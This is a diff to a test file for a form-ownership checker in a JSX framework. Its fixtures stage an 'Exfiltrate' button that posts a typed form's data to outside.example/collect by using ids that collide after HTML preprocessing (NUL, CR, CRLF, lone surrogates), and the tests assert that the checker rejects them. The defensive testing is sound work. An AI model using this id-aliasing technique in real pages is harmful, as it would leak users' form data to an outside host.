@@ -119,24 +119,65 @@ export function TypedForm() {
     ).not.toEqual([]);
   });
 
-  it('rejects source-distinct form ids that HTML parsing canonicalizes to one owner', () => {
-    // The HTML tokenizer replaces U+0000 with U+FFFD. Source-string comparison therefore cannot
-    // prove the second form is separate: after SSR parsing both ids collide and the first (typed)
-    // form owns the external submitter.
+  it.each([
+    ['NUL replacement', 'account\u0000save', 'account\ufffdsave'],
+    ['CR preprocessing', 'account\rsave', 'account\nsave'],
+    ['CRLF preprocessing', 'account\r\nsave', 'account\nsave'],
+    ['lone surrogate UTF-8 replacement', 'account\ud800save', 'account\ufffdsave'],
+  ])('rejects source-distinct form ids that alias after %s', (_label, authoredId, wireId) => {
+    // SPEC §§5.2, 6.3, and 9.1: form ownership is proved over browser-observed wire identity, not
+    // source UTF-16. HTML preprocessing and UTF-8 encoding must not collapse two proven owners.
     expect(
       kv242(`
 ${optionalMutation}
 export const View = component({
   render: () => <>
-    <form id={"account\\u0000save"} mutation={save}><button>Save</button></form>
-    <form external id="account�save" action="https://preview.example/form" method="get" />
-    <button external form="account�save" formaction="https://outside.example/collect" formmethod="post">
+    <form id={${JSON.stringify(authoredId)}} mutation={save}><button>Save</button></form>
+    <form external id={${JSON.stringify(wireId)}} action="https://preview.example/form" method="get" />
+    <button external form={${JSON.stringify(wireId)}} formaction="https://outside.example/collect" formmethod="post">
       Exfiltrate
     </button>
   </>,
 });
 `),
     ).not.toEqual([]);
+  });
+
+  it('rejects a form reference whose HTML-preprocessed identity targets a typed form', () => {
+    expect(
+      kv242(`
+${optionalMutation}
+export const View = component({
+  render: () => <>
+    <form id={"account\\nsave"} mutation={save}><button>Save</button></form>
+    <form external id="preview" action="/preview" method="get" />
+    <button external form={"account\\rsave"} formaction="https://outside.example/collect" formmethod="post">
+      Exfiltrate
+    </button>
+  </>,
+});
+`),
+    ).not.toEqual([]);
+  });
+
+  it.each([
+    ['literal LF', 'account\nsave'],
+    ['valid surrogate pair', 'account\ud83d\ude00save'],
+  ])('keeps a wire-stable %s form identity provably separate', (_label, previewId) => {
+    expect(
+      kv242(`
+${optionalMutation}
+export const View = component({
+  render: () => <>
+    <form mutation={save}><button>Save</button></form>
+    <form external id={${JSON.stringify(previewId)}} action="/preview" method="get" />
+    <button external form={${JSON.stringify(previewId)}} formaction="/preview/compact" formmethod="get">
+      Preview
+    </button>
+  </>,
+});
+`),
+    ).toEqual([]);
   });
 
   it('rejects opaque JSX-valued output wrapped in an otherwise closed fragment', () => {
